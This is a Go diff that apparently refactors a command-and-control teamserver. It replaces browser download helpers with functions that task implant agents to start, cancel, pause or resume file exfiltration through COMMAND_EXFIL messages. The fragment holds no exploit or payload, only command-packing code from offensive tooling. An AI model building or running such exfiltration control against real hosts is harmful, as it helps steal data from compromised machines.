@@ -1823,17 +1823,6 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 
 /// BROWSERS
 
-func BrowserDownloadChangeState(fid string, newState int) ([]byte, error) {
-	fileId, err := strconv.ParseInt(fid, 16, 64)
-	if err != nil {
-		return nil, err
-	}
-
-	array := []interface{}{COMMAND_EXFIL, newState, int(fileId)}
-
-	return PackArray(array)
-}
-
 func BrowserDisks(agentData adaptix.AgentData) ([]byte, error) {
 	array := []interface{}{COMMAND_DISKS}
 	return PackArray(array)
@@ -1857,10 +1846,44 @@ func BrowserUpload(ts Teamserver, path string, content []byte, agentData adaptix
 	return PackArray(array)
 }
 
-func BrowserDownload(path string, agentData adaptix.AgentData) ([]byte, error) {
+/// DOWNLOADS
+
+func TaskDownloadStart(path string, agentData adaptix.AgentData) ([]byte, error) {
 	array := []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agentData.ACP)}
 	return PackArray(array)
 }
+
+func TaskDownloadCancel(fid string) ([]byte, error) {
+	fileId, err := strconv.ParseInt(fid, 16, 64)
+	if err != nil {
+		return nil, err
+	}
+
+	array := []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_CANCELED, int(fileId)}
+	return PackArray(array)
+}
+
+func TaskDownloadResume(fid string) ([]byte, error) {
+	fileId, err := strconv.ParseInt(fid, 16, 64)
+	if err != nil {
+		return nil, err
+	}
+
+	array := []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_RUNNING, int(fileId)}
+	return PackArray(array)
+}
+
+func TaskDownloadPause(fid string) ([]byte, error) {
+	fileId, err := strconv.ParseInt(fid, 16, 64)
+	if err != nil {
+		return nil, err
+	}
+
+	array := []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_STOPPED, int(fileId)}
+	return PackArray(array)
+}
+
+///
 
 func BrowserJobKill(jobId string) ([]byte, error) {
 	jobIdstr, err := strconv.ParseInt(jobId, 16, 64)
